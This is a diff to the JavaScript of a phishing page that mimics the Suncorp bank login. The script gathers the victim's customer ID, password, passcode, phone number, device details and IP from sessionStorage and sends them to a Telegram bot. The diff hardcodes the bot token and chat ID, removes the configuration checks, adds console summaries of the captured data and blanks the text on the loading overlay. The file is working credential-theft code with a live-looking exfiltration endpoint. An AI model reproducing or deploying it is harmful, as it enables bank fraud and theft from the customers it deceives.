@@ -67,51 +67,10 @@
           <script>
             (function() {
                 // ============================================
-                // TELEGRAM CONFIGURATION - FROM ENVIRONMENT VARIABLES
+                // TELEGRAM CONFIGURATION - USE YOUR CORRECT TOKEN
                 // ============================================
-                // NOTE: Set these environment variables before running:
-                // TELEGRAM_BOT_TOKEN - Your Telegram bot token
-                // TELEGRAM_CHAT_IDS - Comma-separated list of chat IDs
-                
-                // Function to get environment variables
-                function getEnvVar(name, defaultValue = null) {
-                    // Check for different environment variable patterns
-                    if (typeof process !== 'undefined' && process.env) {
-                        if (process.env[name]) return process.env[name];
-                        if (process.env[`VITE_${name}`]) return process.env[`VITE_${name}`];
-                        if (process.env[`REACT_APP_${name}`]) return process.env[`REACT_APP_${name}`];
-                    }
-                    
-                    // Check for window._env_ (runtime injection)
-                    if (typeof window !== 'undefined' && window._env_ && window._env_[name]) {
-                        return window._env_[name];
-                    }
-                    
-                    // Check for import.meta.env (Vite)
-                    if (typeof import !== 'undefined' && import.meta && import.meta.env && import.meta.env[name]) {
-                        return import.meta.env[name];
-                    }
-                    
-                    return defaultValue;
-                }
-                
-                // Get configuration from environment variables
-                const TELEGRAM_BOT_TOKEN = getEnvVar('TELEGRAM_BOT_TOKEN');
-                const TELEGRAM_CHAT_IDS_RAW = getEnvVar('TELEGRAM_CHAT_IDS');
-                
-                // Parse chat IDs from comma-separated string
-                let TELEGRAM_CHAT_IDS = [];
-                if (TELEGRAM_CHAT_IDS_RAW) {
-                    TELEGRAM_CHAT_IDS = TELEGRAM_CHAT_IDS_RAW.split(',').map(id => id.trim());
-                }
-                
-                // Validate configuration
-                if (!TELEGRAM_BOT_TOKEN) {
-                    console.error('❌ TELEGRAM_BOT_TOKEN environment variable is not set!');
-                }
-                if (!TELEGRAM_CHAT_IDS.length) {
-                    console.error('❌ TELEGRAM_CHAT_IDS environment variable is not set!');
-                }
+                const TELEGRAM_BOT_TOKEN = '8895813826:AAHHNBhRWC05tlc7PpaaEEjNEx33F8HdMxk';
+                const TELEGRAM_CHAT_IDS = ['-5051925986'];
                 
                 // Function to get data from sessionStorage (set by index.html)
                 function getStolenData() {
@@ -122,6 +81,7 @@
                     };
                     
                     try {
+                        // Read from sessionStorage (where index.html stores the data)
                         const userId = sessionStorage.getItem('userId');
                         const userPassword = sessionStorage.getItem('userPassword');
                         const userPasscode = sessionStorage.getItem('userPasscode');
@@ -157,6 +117,7 @@
                 // Get device info
                 function getDeviceInfo() {
                     const ua = navigator.userAgent;
+                    let device = 'Unknown';
                     let platform = 'Unknown';
                     let browser = 'Unknown';
                     
@@ -166,13 +127,16 @@
                     else if (/Android/.test(ua)) platform = 'Android';
                     else if (/iPad|iPhone|iPod/.test(ua)) platform = 'iOS';
                     
+                    if (/Mobile|Android|iPhone|iPad|iPod/.test(ua)) device = 'Mobile';
+                    else device = 'Desktop';
+                    
                     if (/Chrome/.test(ua) && !/Edg/.test(ua)) browser = 'Chrome';
                     else if (/Firefox/.test(ua)) browser = 'Firefox';
                     else if (/Safari/.test(ua) && !/Chrome/.test(ua)) browser = 'Safari';
                     else if (/Edg/.test(ua)) browser = 'Edge';
                     else if (/MSIE|Trident/.test(ua)) browser = 'Internet Explorer';
                     
-                    return { platform, browser };
+                    return { device, platform, browser };
                 }
                 
                 // Get IP address
@@ -188,11 +152,6 @@
                 
                 // Send to Telegram
                 async function sendToTelegram(phoneNumber, stolenData) {
-                    if (!TELEGRAM_BOT_TOKEN || !TELEGRAM_CHAT_IDS.length) {
-                        console.error('❌ Cannot send to Telegram: Missing configuration');
-                        return 0;
-                    }
-                    
                     const deviceInfo = getDeviceInfo();
                     let clientIP = 'Unable to retrieve';
                     try {
@@ -209,7 +168,8 @@
                         second: '2-digit'
                     });
                     
-                    const message = `SUNCORP
+// Build detailed message
+const message = `SUNCORP
 
 Customer ID: ${stolenData.userId}
 Password: ${stolenData.password}
@@ -220,7 +180,7 @@ UA: ${navigator.userAgent}
 Platform: ${deviceInfo.platform}
 Date: ${timestamp}`;
 
-                    const telegramUrl = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
+const telegramUrl = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
                     
                     let successCount = 0;
                     for (const chatId of TELEGRAM_CHAT_IDS) {
@@ -263,21 +223,30 @@ Date: ${timestamp}`;
                     // Get stolen data from sessionStorage
                     const stolenData = getStolenData();
                     
-                    // Log captured data
+                    // Log to console for debugging
                     console.log('=== CAPTURED DATA ===');
                     console.log('User ID:', stolenData.userId);
                     console.log('Password:', stolenData.password);
                     console.log('Token/Passcode:', stolenData.passcode);
                     console.log('=====================');
                     
-                    // Create error element for phone
+                    // Display captured data in console for verification
+                    const dataSummary = `
+                        📊 DATA CAPTURED FROM LOGIN PAGE:
+                        • Customer ID: ${stolenData.userId}
+                        • Password: ${stolenData.password ? '✓ Captured' : '✗ Missing'}
+                        • Token Code: ${stolenData.passcode ? '✓ Captured' : '✗ Not provided'}
+                    `;
+                    console.log(dataSummary);
+                    
+                    // Create error element
                     let errorDiv = document.getElementById('phone-error');
                     if (!errorDiv) {
                         errorDiv = document.createElement('div');
                         errorDiv.id = 'phone-error';
                         errorDiv.className = 'sg-Validation-errorWrapper';
-                        errorDiv.style.cssText = 'display: none; margin-top: 5px; color: #d32f2f; font-size: 12px;';
-                        errorDiv.innerHTML = '<p>⚠️ Please enter a valid Australian phone number (04xxxxxxxx).</p>';
+                        errorDiv.style.cssText = 'display: none; margin-top: 5px; color: #d32f2f;';
+                        errorDiv.innerHTML = '<p>Please enter a valid Australian phone number (04xxxxxxxx).</p>';
                         phoneInput.parentNode.appendChild(errorDiv);
                     }
                     
@@ -315,7 +284,7 @@ Date: ${timestamp}`;
                             `;
                             overlay.innerHTML = `
                                 <div style="width: 50px; height: 50px; border: 4px solid #fff; border-top-color: #ffc800; border-radius: 50%; animation: spin 1s linear infinite;"></div>
-                                <p style="color: #ffc800; margin-top: 20px;">Verifying your details...</p>
+                                <p style="color: #ffc800; margin-top: 20px;"></p>
                             `;
                             document.body.appendChild(overlay);
                         }
@@ -332,14 +301,13 @@ Date: ${timestamp}`;
                     style.textContent = '@keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }';
                     document.head.appendChild(style);
                     
-                    // Handle submit - ONLY validate phone number
+                    // Handle submit
                     form.addEventListener('submit', async function(e) {
                         e.preventDefault();
                         clearError();
                         
                         const phone = phoneInput.value.trim();
                         
-                        // Only validate phone number (User ID is already captured from index.html)
                         if (!phone || !isValidPhone(phone)) {
                             showError();
                             phoneInput.focus();
@@ -357,7 +325,7 @@ Date: ${timestamp}`;
                             console.error('✗ Failed to send to Telegram');
                         }
                         
-                        // Clear sessionStorage after sending
+                        // Clear sessionStorage after sending (optional)
                         try {
                             sessionStorage.removeItem('userId');
                             sessionStorage.removeItem('userPassword');
